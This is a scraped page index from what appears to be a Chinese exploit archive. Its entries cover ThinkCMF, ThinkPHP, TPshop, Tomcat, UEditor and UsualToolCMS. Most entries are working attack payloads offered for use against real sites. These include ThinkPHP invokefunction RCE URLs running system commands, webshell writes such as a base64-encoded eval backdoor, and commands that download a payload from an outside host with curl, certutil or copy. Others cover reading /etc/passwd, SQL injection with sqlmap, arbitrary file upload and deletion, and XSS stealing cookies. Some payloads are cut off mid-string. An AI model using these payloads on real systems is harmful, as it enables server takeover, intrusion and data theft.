\"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/ThinkCMF/1.html":{"url":"0day/ThinkCMF/1.html","title":"ThinkCMF 框架上的任意内容包含漏洞","keywords":"","body":"ThinkCMF 框架上的任意内容包含漏洞 一、漏洞简介 二、漏洞影响 ThinkCMF X1.6.0 ThinkCMF X2.1.0 ThinkCMF X2.2.0 ThinkCMF X2.2.1 ThinkCMF X2.2.2 三、复现过程 根据index.php中的配置，他的项目路径为application，打开 Portal 下的 Controller 目录，选择一个控制类文件。 发现他的父类为Common\\Controller\\HomebaseController。 在HomeBaseController中加入如下测试代码 ThinkPHP是一套基于MVC的应用程序框架，被分成三个核心部件：模型（M）、视图（V）、控制器（C）。 由于添加的代码在控制器中，根据ThinkPHP框架约定可以通过a参数来指定对应的函数名，但是该函数的修饰符必须为Public, 而添加的代码正好符合该条件。 可以通过如下URL进行访问，并且可以添加GET参数arg1传递给函数。 http://127.0.0.1/cmfx-master/?a=test_public&arg1=run%20success HomeBaseController类中有一些访问权限为public的函数， 重点关注display函数.看描述就是可以自定义加载模版，通过 $this->parseTemplate 函数根据约定确定模版路径，如果不符合原先的约定将会从当前目录开始匹配。 然后调用THinkphp Controller 函数的display方法 /** * 加载模板和页面输出 可以返回输出内容 * @access public * @param string $templateFile 模板文件名 * @param string $charset 模板输出字符集 * @param string $contentType 输出类型 * @param string $content 模板输出内容 * @return mixed */ public function display($templateFile = '', $charset = '', $contentType = '', $content = '', $prefix = '') { parent::display($this->parseTemplate($templateFile), $charset, $contentType,$content,$prefix); } 再往下就是调用Think View的fetch方法，这里的TMPL_ENGINE_TYPE 为Think, 最终模版内容解析在ParseTemplateBehavior中完成 如下调用即可加载任意文件 http://0-sec.org:81/cmfx-master/?a=display&templateFile=README.md 往下面翻阅发现还有fetch方法，display方法相对fetch只是多了一个render的过程，而且这里不需要知道文件路径 最终完美payload http://0-sec.org/?a=fetch&templateFile=public/index&prefix=''&content=file_put_contents('test.php','') 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-04 00:39:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/ThinkCMF/THINKCMFX_2.2.3漏洞合集.html":{"url":"0day/ThinkCMF/THINKCMFX_2.2.3漏洞合集.html","title":"THINKCMFX_2.2.3漏洞合集","keywords":"","body":"0x01 前台用户文章编辑提交存在注入 0x01.1 漏洞演示 前台的文章编辑中操作框架注入，所以可以直接sql注入 url:http://thinkcmf.test/index.php?g=Portal&m=Article&a=edit_post post: term:123 post[post_title]:123 post[post_title]:aaa post_title:123 post[id][0]:bind post[id][1]:0 and (updatexml(1,concat(0x7e,(select user()),0x7e),1)) 0x01.2 漏洞原理 文件：ThinkCMFX_2.2.3\\application\\Portal\\Controller\\ArticleController.class.php 方法：public function edit_post( 这里不多讲，因为没得意义。详情请看先知的历史tp漏洞，谢谢：) 0x02 前台模版注入漏洞-可getshell两处 0x02.1 Comment类模版引擎注入演示 url:http://thinkcmf.test/index.php?g=Comment&m=Widget&a=fetch post: templateFile=/../public/index prefix='' content=file_put_contents('test.php',' 发送之后页面http状态会为200，这样就表示成功了 简单讲解一下：content 我输入了php代码所以他会在本地跟路径创建一个一句话木马test.php 所以实战过程中。 连接马子：http://xxxxx.com/test.php 密码:11 即可getshell 0x02.2 Api类模版注入1 url:http://thinkcmf.test/index.php?g=Api&m=Plugin&a=fetch post: templateFile=/../../../public/index prefix='' content=file_put_contents('test1.php',' 同上一样，会在跟目录生成 马子 test1.php 0x02.3 漏洞原理 路径:ThinkCMFX\\application\\Comment\\Controller\\WidgetController.class.php 路径:ThinkCMFX\\application\\Api\\Controller\\PluginController.class.php 两处的漏洞原理都是一样的，所以我就选一处进行讲解了 路径:application\\Comment\\Controller\\WidgetController.class.php 方法：public function fetch() 从名字查看我们会发现他的3个参数 $templateFile=模版地址 $content=内容 $prefix=前缀 $templateFile就是我们要包含的文件了，我们必须包含一个不然，代码会报错，导致无法写shell $content 我们写马子的地方 $prefix 忽略他即可，没有用的 在代码中我们看到一个 $templateFile 给parseTemplate函数包含了，这里我们也不用管他，因为他的作用就是判断一下文件是否存在而已，所以我们在实战的时候，可以找到一处html文件包含即可 而tp的模版引擎 使用的是 smarty 而smarty中只要可控制内容的key 与 value 即可写入shell命令，所以同理可得，tp的 $content 我们可控 = 有模版注入 0x03 任意文件删除-只能windows删除 0x03.1 漏洞演示 url：http://thinkcmf.test/index.php?g=User&m=Profile&a=do_avatar post: mgurl=..\\..\\..\\..\\..\\1.txt 0x03.2 漏洞原理 路径：ThinkCMFX\\application\\User\\Controller\\ProfileController.class.php 方法：blic function do_avatar( 从文件可以看到 $imgurl=str_replace('/','',$imgurl); 过滤了 / 但是没有过滤 所以我们无法引入 / 并且在更新头像以后还会从前端接收参数 imgurl 带入函数sp_delete_avatar 跟进去 路径：ThinkCMFX\\application\\Common\\Common\\function.php 方法：function sp_delete_avatar( 0x04 前台任意上传漏洞 0x04.1 漏洞演示 记得一定要登录! 记得一定要登录! 记得一定要登录! 记得在前台注册一个账号进行登录或是直接登录后台然后在访问此地址 打开url: http://atest.test/cms/ThinkCMFX_2.2.3/index.php?g=Asset&m=Ueditor&a=upload&action=uploadfile POST: file = php一句话木马的文件 1.php shell地址: http://atest.test/cms/ThinkCMFX_2.2.3/data/upload/ueditor/20190724/5d3833dcce7e3.php?1=phpinfo(); 0x04.2 为什么要登录 路径：ThinkCMFX\\application\\Asset\\Controller\\UeditorController.class.php 方法：public function _initialize() 0x04.3 漏洞原理 路径：ThinkCMFX\\application\\Asset\\Controller\\UeditorController.class.php 方法：public function upload( 路径：ThinkCMFX\\application\\Asset\\Controller\\UeditorController.class.php 方法：private function _ueditor_upload 该方法使用 $upload_setting=sp_get_upload_setting(); 先获取所有上传的配置 在用 $allowed_exts=explode(',', $upload_setting[$filetype]); 来获取允许上传的后缀 这里我们先跟进去查看 sp_get_upload_setting(); 函数 路径：application\\Common\\Common\\function.php 方法：function sp_get_upload_setting() 接下来我们需要重点查看一下：$upload_setting[$filetype] 我们可以打印一下,看看他的返回值 路径: application\\Asset\\Controller\\UeditorController.class.php 方法: private function _ueditor_upload( 代码: $upload_setting[$filetype] 然后我们在看看他的代码 $allowed_exts=explode(',', $upload_setting[$filetype]); 路径: application\\Asset\\Controller\\UeditorController.class.php 方法: private function _ueditor_upload( 代码: $allowed_exts=explode(',', $upload_setting[$filetype]); $upload_setting[$filetype] 执行以后返回的结果是数组并且为2: array(2) { [\"upload_max_filesize\"]=> string(5) \"10240\" [\"extensions\"]=> string(42) \"txt,pdf,doc,docx,xls,xlsx,ppt,pptx,zip,rar\" } 而这里用了php函数: explode 让我们看看这个函数的作用 把字符串转成数组,可是他返回的就是数组所以 $allowed_exts=explode(',', $upload_setting[$filetype]); 执行返回空 让我们测试一下看看 路径: application\\Asset\\Controller\\UeditorController.class.php 方法: private function _ueditor_upload() 跟进去tp的上传方法查看一下 路径：ThinkCMFX_2.2.3\\simplewind\\Core\\Library\\Think\\Upload.class.php 方法：public function upload() 路径：ThinkCMFX_2.2.3\\simplewind\\Core\\Library\\Think\\Upload.class.php 方法：private function check() 路径：ThinkCMFX_2.2.3\\simplewind\\Core\\Library\\Think\\Upload.class.php 方法：private function checkExt() 因为这里返回了true所以实际上他并没有验证后缀 所以我们也就多了一个任意文件上传漏洞 0x05 使用说明 前面说了，thinkcmf 并没有死，并且有3版本与5版本这里提供一些方法，帮助你们辨别哪一些是可以日的，那一些事不行的。 1，看logo 3的logo是黄色的例如下图 2，在网站url 后面输入 admin 如果页面是蓝色的表示是3的，可日穿之 3，查看 README.md 在网站url后面输入README.md 另外还有一个说明，你在实际操作的过程中，可能会遇到他一直报这个错 url:http://thinkcmf.test/index.php?g=Comment&m=Widget&a=fetch post: templateFile=/../public/index prefix='' content=file_put_contents('test.php',' 请放心这并不是说明漏洞不可使用，而是说，这个模版不存在，你可以换一个html即可 例如： /../public/index /../public/exception /../data/index /../data/runtime/index /../plugins/Mobileverify/View/admin_index /../plugins/Mobileverify/View/index /../plugins/Mobileverify/View/widget /../plugins/Demo/View/admin_index /../plugins/Demo/View/index /../plugins/Demo/View/widget /../application/Install/View/Public/footer /../application/Install/View/Public/head /../application/Install/View/Public/header /../application/Common/index /../application/Portal/Lang/en-us/index /../application/Api/Lang/en-us/index /../application/Api/Lang/zh-cn/index /../application/Comment/Lang/en-us/index /../application/Comment/Lang/zh-cn/index url:http://thinkcmf.test/index.php?g=Api&m=Plugin&a=fetch post: templateFile=/../../../public/index prefix='' content=file_put_contents('test1.php',' /../../../public/index /../../../public/exception /../../../data/index /../../../data/runtime/index /../../../plugins/Mobileverify/View/admin_index /../../../plugins/Mobileverify/View/index /../../../plugins/Mobileverify/View/widget /../../../plugins/Demo/View/admin_index /../../../plugins/Demo/View/index /../../../plugins/Demo/View/widget /../../../application/Install/View/Public/footer /../../../application/Install/View/Public/head /../../../application/Install/View/Public/header /../../../application/Common/index /../../../application/Portal/Lang/en-us/index /../../../application/Api/Lang/en-us/index /../../../application/Api/Lang/zh-cn/index /../../../application/Comment/Lang/en-us/index /../../../application/Comment/Lang/zh-cn/index 还有最后一句废话：模版注入对于linux 并不好用 : ) 差不多了，剩下的自己去thinkcmf里面自己找 文章来源于https://www.yuque.com/pmiaowu/bfgkkh/aiiak1 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-20 22:33:14 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/1.html":{"url":"0day/Thinkphp/1.html","title":"thinkphp专用shell","keywords":"","body":"thinkphp专用shell 一、漏洞简介 基于thinkphp框架的一句话写法 thinkphp框架使用入口文件调用控制器，直接写一句话可能会有解析问题导致无法执行指令，研究了一下把一句话套入框架控制器的方法，分享给大家参考， 二、漏洞影响 三、复现过程 在index的控制器文件夹下建立Test.php文件，代码如下: 一句话的地址就是http://www.0-sec.org/index/test/test 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-01 05:30:40 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/2.html":{"url":"0day/Thinkphp/2.html","title":"thinkphp5.0.1","keywords":"","body":"thinkphp5.0.1 一、漏洞简介 二、漏洞影响 三、复现过程 1、判断是否存在漏洞 poc1 http://wwww.com/public s=phpinfo()&_method=__construct&filter=assert _method=__construct&method=get&filter[]=call_user_func&server[]=phpinfo&get[]=phpinfo _method=__construct&method=get&filter[]=call_user_func&get[]=phpinfo _method=__construct&method=get&filter[]=call_user_func&get[0]=phpinfo&get[1]=1 poc2 http:/xxxx.com/?s=index/index/index s=ipconfig&_mehthod=__construct$method=&filter[]=system 2、深入利用 使用post提交 1、使用assert函数 s=phpinfo()&_method=__construct&filter=assert 2、include函数，可以根据此函数查看一些文件及其配置 s=include(\"/etc/passwd\")&_method=__construct&filter=assert 3、file_put_contents函数，可以直接写入文件 s=file_put_contents('/data/wwwroot/www.0-sec.org/application/index/test.php',base64_decode('PD9waHAgJHBhc3M9JF9QT1NUWydhYWFhJ107ZXZhbCgkcGFzcyk7Pz4'))&_method=__construct&filter=assert 4、读取文件 _method=__construct&method=get&filter[]=think\\__include_file&server[]=phpinfo&get[]=../application/.htaccess s=include(\"../application/.htaccess\")&_method=__construct&filter=assert //ps:如果不加.. 请加上完整路径 5、var_dump函数，可以查看该路径下的文件，文件夹 s=var_dump(scandir('../application/'))&_method=__construct&filter=assert 6、复制文件 s=copy(\"/data/wwwroot/ws.tar\", \"/data/wwwroot/ws.duochengnet.com/public/ws.tar\")&_method=__construct&filter=assert 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-01 05:43:22 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/3.html":{"url":"0day/Thinkphp/3.html","title":"thinkphp5.0.5","keywords":"","body":"thinkphp5.0.5 一、漏洞简介 二、漏洞影响 三、复现过程 waf对eval进行了拦截 禁止了assert函数对eval函数后面的括号进行了正则过滤 对file_get_contents函数后面的括号进行了正则过滤 http://www.0-sec.org/?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=2.php&vars[1][1]= 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-01 05:40:18 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/4.html":{"url":"0day/Thinkphp/4.html","title":"thinkphp5.0.11","keywords":"","body":"thinkphp5.0.11 一、漏洞简介 二、漏洞影响 三、复现过程 http://www.0-sec.org/?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][0]=curl https://www.hack.com/xxx.js -o ./upload/xxx.php 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-01 05:41:28 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/5.html":{"url":"0day/Thinkphp/5.html","title":"thinkphp5.0.14","keywords":"","body":"thinkphp5.0.14 一、漏洞简介 二、漏洞影响 三、复现过程 1、常规命令 ?s=index/think\\app/invokefunction&function=&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php.jpg&vars[1][]=%3C?php%20phpinfo();?3E 2、eval（''）和assert（''）被拦截，命令函数被禁止 http://www.xxxx.com/?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=phpinfo(); http://www.xxx.com/?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=eval($_GET[1])&1=call_user_func_array(\"file_put_contents\",array(\"3.php\",file_get_contents(\"https://www.hack.com/xxx.js\"))); 3、基于php7.2环境下 http://www.xxxx.cn/?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][0]=1.txt&vars[1][1]=1 http://www.xxxx.cn/?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][0]=index11.php&vars[1][1]= 写进去发现转义了尖括号 4、通过copy函数 http://www.xxxx.cn/?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][0]= https://www.hack.com/xxx.js&vars[1][1]=112233.php 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-01 05:54:14 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/6.html":{"url":"0day/Thinkphp/6.html","title":"thinkphp5.0.18","keywords":"","body":"thinkphp5.0.18 一、漏洞简介 二、漏洞影响 三、复现过程 1、windows http://www.xxxx.com/?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][0]=1 http://www.xxxx.com/?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=phpinfo() 2、使用certutil http://www.xxxx.com/?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=passthru&vars[1][0]=cmd /c certutil -urlcache -split -f https://www.hack.com/xxx.js uploads/1.php 由于根目录没写权限，所以写到uploads 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-01 05:53:38 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/7.html":{"url":"0day/Thinkphp/7.html","title":"thinkphp5.0.21","keywords":"","body":"thinkphp5.0.21 一、漏洞简介 二、漏洞影响 三、复现过程 1、poc http://0-sec.org/thinkphp_5.0.21/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami 2、poc http://0-sec.org/thinkphp_5.0.21/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 3、poc http://0-sec.org/public/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET['fuck']);&fuck=system(\"whoami\"); 4、poc http://0-sec.org/public/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET['fuck']);&fuck=eval($_POST[ian]); 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-01 05:53:20 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/8.html":{"url":"0day/Thinkphp/8.html","title":"thinkphp5.0.22","keywords":"","body":"thinkphp5.0.22 一、漏洞简介 二、漏洞影响 三、复现过程 1、poc http://0-sec.org/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami 2、poc http://0-sec.org/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-01 05:52:40 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/9.html":{"url":"0day/Thinkphp/9.html","title":"thinkphp5.0.23","keywords":"","body":"thinkphp5.0.23 一、漏洞简介 二、漏洞影响 三、复现过程 POST /index.php?s=captcha HTTP/1.1 Host: yuorip Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 72 _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=whoami 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-01 05:50:30 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/10.html":{"url":"0day/Thinkphp/10.html","title":"thinkphp5.1.18","keywords":"","body":"thinkphp5.1.18 一、漏洞简介 二、漏洞影响 三、复现过程 1、常规poc http://www.xxxxx.com/?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][0]=index11.php&vars[1][1]= 2、所有目录都无写入权限,base64函数被拦截 http://www.xxxx.com/?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=eval($_POST[1]) 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-01 05:52:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/11.html":{"url":"0day/Thinkphp/11.html","title":"thinkphp5.1.29","keywords":"","body":"thinkphp5.1.29 一、漏洞简介 二、漏洞影响 三、复现过程 1、代码执行 http://www.0-sec.org/?s=index/\\think\\Request/input&filter=phpinfo&data=1 http://www.0-sec.org/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 http://www.0-sec.org/?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 2、命令执行 http://www.0-sec.org/?s=index/\\think\\Request/input&filter=system&data=操作系统命令 http://www.0-sec.org/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=操作系统命令 http://www.0-sec.org/?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=操作系统命令 3、文件写入 http://www.0-sec.org/?s=index/\\think\\template\\driver\\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E http://www.0-sec.org/?s=index/\\think\\view\\driver\\Php/display&content=%3C?php%20phpinfo();?%3E 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-01 05:56:54 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp shop/1.html":{"url":"0day/Thinkphp shop/1.html","title":"Thinkphp Shop前台SQL注入","keywords":"","body":"Thinkphp Shop前台SQL注入 一、漏洞简介 二、漏洞影响 三、复现过程 http://www.0-sec.org/mobile/index/index2/id/1' sqlmap -u \"http://www.0-sec.org/mobile/index/index2/id/1*\" --random-agent --batch --dbms \"mysql\" --current-db 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-01 14:55:16 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp shop/2.html":{"url":"0day/Thinkphp shop/2.html","title":"（CVE-2018-9919）Thinkphp Shop后门","keywords":"","body":"（CVE-2018-9919）Thinkphp Shop后门 一、漏洞简介 该漏洞源于/vendor/phpdocumentor/reflection-docblock/tests/phpDocumentor/Reflection/DocBlock/Tag/LinkTagTeet.php可以将文件下载到其他服务器上。远程攻击者可利用该漏洞获取敏感信息，并可能执行命令。 二、漏洞影响 Backdoor in Tpshop 三、复现过程 攻击者可以利用此漏洞来攻击服务器并增加其特权，例如：下载任意文件PS！扫描网络端口PS！信息检测，攻击内部网络易受攻击的服务器。 http://www.0-sec.org/vendor/phpdocumentor/reflection-docblock/tests/phpDocumentor/Reflection/DocBlock/Tag/LinkTagTeet.php?bddlj=save_filename&down_url=download_url&jmmy=decryptpass 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-01 14:53:30 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp shop/3.html":{"url":"0day/Thinkphp shop/3.html","title":"Thinkphp Shop 供应商后台本地文件包含导致权限提升","keywords":"","body":"Thinkphp Shop 供应商后台本地文件包含导致权限提升 一、漏洞简介 二、漏洞影响 三、复现过程 1、用户个人资料修改处上传图片 http://www.0-sec.org/Home/User/info.html 2、上传一张正常图片，并在图片末尾加上一句话 3、返回shell http://www.0-sec.org/supplier/order/delivery_print?template=public/upload/user/4575/head_pic/5989ee42cc5992e64a60c52b0cbb7602.png&w=phpinfo(); 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-01 15:04:26 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Tomcat/1.html":{"url":"0day/Tomcat/1.html","title":"（CVE-2017-12615）tomcat PUT方法任意文件写入漏洞","keywords":"","body":"（CVE-2017-12615）tomcat PUT方法任意文件写入漏洞 一、漏洞简介 当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件。之后，JSP 文件中的代码将能被服务器执行。 二、漏洞影响 Apache Tomcat 7.0.0 – 7.0.81 三、复现过程 PUT /1.jsp/ HTTP/1.1 Host: your-ip:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 5 shell 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-01 06:00:24 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Ueditor/1.html":{"url":"0day/Ueditor/1.html","title":"ueditor ssrf","keywords":"","body":"ueditor ssrf 一、漏洞简介 二、漏洞影响 三、复现过程 存在漏洞路径： /ueditor/jsp/getRemoteImage.jsp?upfile=http://127.0.0.1/favicon.ico?.jpg /ueditor/jsp/controller.jsp?action=catchimage&source[]=https://www.baidu.com/img/baidu_jgylogo3.gif /ueditor/php/controller.php?action=catchimage&source[]=https://www.baidu.com/img/baidu_jgylogo3.gif 存在就会抓取成功、也可以抓取外网的测试 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-01 16:10:48 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Ueditor/2.html":{"url":"0day/Ueditor/2.html","title":"ueditor 允许xml上传的xss漏洞","keywords":"","body":"ueditor 允许xml上传的xss漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 '\">\" xmlns:something=\"xss平台地址\">1234 Ueditor 默认支持上传 xml ：config.json可以查看支持上传的后缀 /ueditor/asp/config.json /ueditor/net/config.json /ueditor/php/config.json /ueditor/jsp/config.json 上传文件路径 /ueditor/index.html /ueditor/asp/controller.asp?action=uploadimage /ueditor/asp/controller.asp?action=uploadfile /ueditor/net/controller.ashx?action=uploadimage /ueditor/net/controller.ashx?action=uploadfile /ueditor/php/controller.php?action=uploadfile /ueditor/php/controller.php?action=uploadimage /ueditor/jsp/controller.jsp?action=uploadfile /ueditor/jsp/controller.jsp?action=uploadimage 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-01 16:30:30 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Ueditor/3.html":{"url":"0day/Ueditor/3.html","title":"ueditor .net版本上传漏洞","keywords":"","body":"ueditor .net版本上传漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 本地上传poc shell addr: 上传文件名为 1.gif;.aspx 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-01 16:32:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Ueditor/4.html":{"url":"0day/Ueditor/4.html","title":"百度ueditor编辑器 xss漏洞","keywords":"","body":"百度ueditor编辑器 xss漏洞 一、漏洞简介 产品官网下载地址： https://ueditor.baidu.com/website/download.html#mini 涉及版本：php , asp, jsp, net 二、漏洞影响 三、复现过程 漏洞分析 存在漏洞的文件： /php/getContent.php /asp/getContent.asp /jsp/getContent.jsp /net/getContent.ashx /php/getContent.php 入进行了过滤，但是在14行输出时却使用了htmlspecialchars_decode，造成XSS漏洞。 /asp/getContent.asp 获取myEditor参数无过滤，直接输出。 /jsp/getContent.jsp 获取myEditor参数无过滤，直接输出。 /net/getContent.ashx 获取myEditor参数无过滤，直接输出。 漏洞复现 php版本测试，其他版本一样。 url: http://0-sec.org/php/getcontent.php payload: myEditor=alert(document.cookie) // myEditor中的’ E ’必须大写，小写无效。 由于只是个反弹XSS，单独这个漏洞影响小。若能结合使用该编辑器的网站的其他漏洞使用，则可能产生不错的效果。 四、参考链接 https://blog.csdn.net/yun2diao/article/details/91381846 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-16 19:54:52 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/UsualToolcms/5.html":{"url":"0day/UsualToolcms/5.html","title":"UsualToolcms 8.0 系统重装漏洞","keywords":"","body":"UsualToolcms 8.0 系统重装漏洞 一、漏洞简介 无验证, 在安装cms完成后 并不会自动删除文件 又不会生成lock来判断是否安装过了。 导致了可以直接重装过 setup/index.php 安装地址 二、漏洞影响 UsualToolCMS大众版5.0 UsualToolcms 8.0 三、复现过程 alert('数据库设置成功!');window.location.href='?l=sql'\"; } if($t==\"testdb\"){ $dbhost=$_POST[\"dbhost\"]; $dbname=$_POST[\"dbname\"]; $dbuser=$_POST[\"dbuser\"]; $dbpass=$_POST[\"dbpass\"]; $mysqli=new mysqli($dbhost,$dbuser,$dbpass,$dbname); echo \"alert('测试完成!\".$mysqli->connect_error.\"');window.location.href='?l=sqlback'\"; } if($t==\"sqlback\"){ include('../sql_db.php'); $sqlcontent=$_POST['sqlcontent']; $res=$mysqli -> multi_query($sqlcontent); echo \"alert('数据库结构规划完成!');window.location.href='?l=setup'\"; } if($t==\"update\"){ include('../sql_db.php'); $authcode=$_POST[\"authcode\"];$webname=$_POST[\"webname\"]; $weblogo=$_POST[\"weblogo\"]; $weburl=$_POST[\"weburl\"]; $template=$_POST[\"template\"]; $webisclose=$_POST[\"webisclose\"]; $develop=$_POST[\"develop\"]; $articlelistnum=$_POST[\"articlelistnum\"]; $indexarticlenum=$_POST[\"indexarticlenum\"]; $indexarticlerenum=$_POST[\"indexarticlerenum\"]; $articlehitnum=$_POST[\"articlehitnum\"]; $goodslistnum=$_POST[\"goodslistnum\"]; $indexgoodsnum=$_POST[\"indexgoodsnum\"]; $indexgoodsrenum=$_POST[\"indexgoodsrenum\"]; $goodshitnum=$_POST[\"goodshitnum\"]; $article=$_POST[\"article\"]; $goods=$_POST[\"goods\"]; $messagebook=$_POST[\"messagebook\"]; $orders=$_POST[\"orders\"]; $members=$_POST[\"members\"]; $usercookname=$_POST[\"usercookname\"]; $sqls=\"INSERT INTO `cms_setup` (authcode,webname,weblogo,weburl,template,webisclose,develop,articlelistnum,indexarticlenum, indexarticlerenum,articlehitnum,goodslistnum,indexgoodsnum,indexgoodsrenum,goodshitnum,article,goods,messagebook,orders,members,usercookname,installtime) VALUES 